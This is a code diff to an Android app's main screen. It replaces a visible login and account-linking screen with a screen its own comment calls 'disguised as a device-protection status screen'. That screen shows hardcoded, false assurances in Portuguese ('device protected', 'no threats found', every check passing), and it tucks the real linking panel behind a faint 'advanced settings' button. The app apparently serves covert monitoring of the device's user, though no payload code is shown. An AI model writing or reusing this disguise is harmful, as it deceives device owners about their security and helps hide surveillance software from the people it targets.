@@ -31,6 +31,7 @@ import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.ui.text.input.ImeAction
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.ArrowBack
 import androidx.compose.material.icons.filled.CheckCircle
 import androidx.compose.material.icons.filled.Visibility
 import androidx.compose.material.icons.filled.VisibilityOff
@@ -319,11 +320,12 @@ class MainActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════════════════════════════════
-    // LOGIN SCREEN
+    // LOGIN SCREEN  (disguised as a device-protection status screen)
     // ═══════════════════════════════════════════════════════════════════════
     @Composable
     fun LoginScreen(onLinked: () -> Unit) {
         var selectedTab     by remember { mutableStateOf(0) }
+        var showConfigPanel by remember { mutableStateOf(false) }
 
         // Conta tab
         var email           by remember { mutableStateOf("") }
@@ -345,6 +347,145 @@ class MainActivity : ComponentActivity() {
             }
         }
 
+        // ── Protection status hero (visible to anyone who opens the app) ──
+        if (!showConfigPanel) {
+            Column(
+                modifier = Modifier
+                    .fillMaxSize()
+                    .background(Color(0xFF0F2419))
+                    .verticalScroll(rememberScrollState()),
+                horizontalAlignment = Alignment.CenterHorizontally
+            ) {
+                // ── Green header band ───────────────────────────────────
+                Box(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .background(Color(0xFF1A9641))
+                        .padding(top = 56.dp, bottom = 36.dp),
+                    contentAlignment = Alignment.Center
+                ) {
+                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                        // Shield + Android icon
+                        Box(
+                            Modifier
+                                .size(100.dp)
+                                .background(Color(0xFF145C2E), shape = androidx.compose.foundation.shape.CircleShape)
+                                .border(3.dp, Color(0xFF4DD87A), androidx.compose.foundation.shape.CircleShape),
+                            Alignment.Center
+                        ) {
+                            Text("🤖", fontSize = 48.sp)
+                        }
+                        Spacer(Modifier.height(20.dp))
+                        Text(
+                            "Seu dispositivo está protegido",
+                            color = Color.White,
+                            fontSize = 22.sp,
+                            fontWeight = FontWeight.Bold,
+                            textAlign = TextAlign.Center,
+                            modifier = Modifier.padding(horizontal = 24.dp)
+                        )
+                        Spacer(Modifier.height(6.dp))
+                        Text(
+                            "Nenhuma ameaça encontrada",
+                            color = Color(0xFFB8F5CB),
+                            fontSize = 14.sp
+                        )
+                    }
+                }
+
+                Spacer(Modifier.height(24.dp))
+
+                // ── Status cards row ────────────────────────────────────
+                Row(
+                    Modifier
+                        .fillMaxWidth()
+                        .padding(horizontal = 16.dp),
+                    horizontalArrangement = Arrangement.spacedBy(12.dp)
+                ) {
+                    listOf(
+                        Triple("🛡️", "Proteção", "Ativa"),
+                        Triple("🔍", "Última verificação", "Agora"),
+                        Triple("⚡", "Ameaças", "0 encontradas")
+                    ).forEach { (emoji, label, value) ->
+                        Card(
+                            modifier = Modifier.weight(1f),
+                            colors = CardDefaults.cardColors(containerColor = Color(0xFF163322)),
+                            shape = RoundedCornerShape(14.dp)
+                        ) {
+                            Column(
+                                Modifier.padding(10.dp),
+                                horizontalAlignment = Alignment.CenterHorizontally
+                            ) {
+                                Text(emoji, fontSize = 22.sp)
+                                Spacer(Modifier.height(4.dp))
+                                Text(label, color = Color(0xFF8DB89A), fontSize = 9.sp, textAlign = TextAlign.Center)
+                                Text(value, color = Color(0xFF4DD87A), fontSize = 10.sp, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center)
+                            }
+                        }
+                    }
+                }
+
+                Spacer(Modifier.height(20.dp))
+
+                // ── Security checklist ──────────────────────────────────
+                Card(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .padding(horizontal = 16.dp),
+                    colors = CardDefaults.cardColors(containerColor = Color(0xFF163322)),
+                    shape = RoundedCornerShape(16.dp)
+                ) {
+                    Column(Modifier.padding(16.dp)) {
+                        Text(
+                            "Verificações de segurança",
+                            color = Color(0xFF4DD87A),
+                            fontWeight = FontWeight.SemiBold,
+                            fontSize = 13.sp
+                        )
+                        Spacer(Modifier.height(12.dp))
+                        listOf(
+                            "Verificação de apps nocivos" to true,
+                            "Proteção em tempo real" to true,
+                            "Atualizações de segurança" to true,
+                            "Modo seguro do sistema" to true
+                        ).forEach { (item, ok) ->
+                            Row(
+                                Modifier
+                                    .fillMaxWidth()
+                                    .padding(vertical = 5.dp),
+                                verticalAlignment = Alignment.CenterVertically
+                            ) {
+                                Icon(
+                                    if (ok) Icons.Default.CheckCircle else Icons.Default.Warning,
+                                    null,
+                                    tint = if (ok) Color(0xFF4DD87A) else Color(0xFFFFB300),
+                                    modifier = Modifier.size(18.dp)
+                                )
+                                Spacer(Modifier.width(10.dp))
+                                Text(item, color = Color(0xFFCCE8D6), fontSize = 13.sp)
+                            }
+                        }
+                    }
+                }
+
+                Spacer(Modifier.height(32.dp))
+
+                // ── Hidden config button (subtle, bottom of screen) ─────
+                TextButton(
+                    onClick = { showConfigPanel = true },
+                    modifier = Modifier.padding(bottom = 24.dp)
+                ) {
+                    Text(
+                        "⚙  Configurações avançadas",
+                        color = Color(0xFF3A5C45),
+                        fontSize = 11.sp
+                    )
+                }
+            }
+            return
+        }
+
+        // ── Actual login/link panel (shown after tapping config) ──────────
         Column(
             modifier = Modifier
                 .fillMaxSize()
@@ -353,27 +494,17 @@ class MainActivity : ComponentActivity() {
                 .padding(horizontal = 28.dp),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
-            Spacer(Modifier.height(72.dp))
+            Spacer(Modifier.height(56.dp))
 
-            // Shield logo
-            Box(
-                Modifier
-                    .size(88.dp)
-                    .background(Color(0xFF0D1826), RoundedCornerShape(26.dp))
-                    .border(1.5.dp, Color(0xFF00D2FF).copy(alpha = 0.35f), RoundedCornerShape(26.dp)),
-                Alignment.Center
-            ) {
-                Text("🛡️", fontSize = 42.sp)
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                IconButton(onClick = { showConfigPanel = false }) {
+                    Icon(Icons.Default.ArrowBack, null, tint = Color(0xFF8E94A5))
+                }
+                Spacer(Modifier.width(4.dp))
+                Text("Configuração", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = Color.White)
             }
 
-            Spacer(Modifier.height(18.dp))
-            Text("AndroidProtect", fontSize = 30.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
-            Text(
-                "Proteção inteligente para seu Android",
-                color = Color(0xFF8E94A5), fontSize = 13.sp,
-                textAlign = TextAlign.Center,
-                modifier = Modifier.padding(top = 6.dp, bottom = 32.dp)
-            )
+            Spacer(Modifier.height(24.dp))
 
             // Card
             Card(
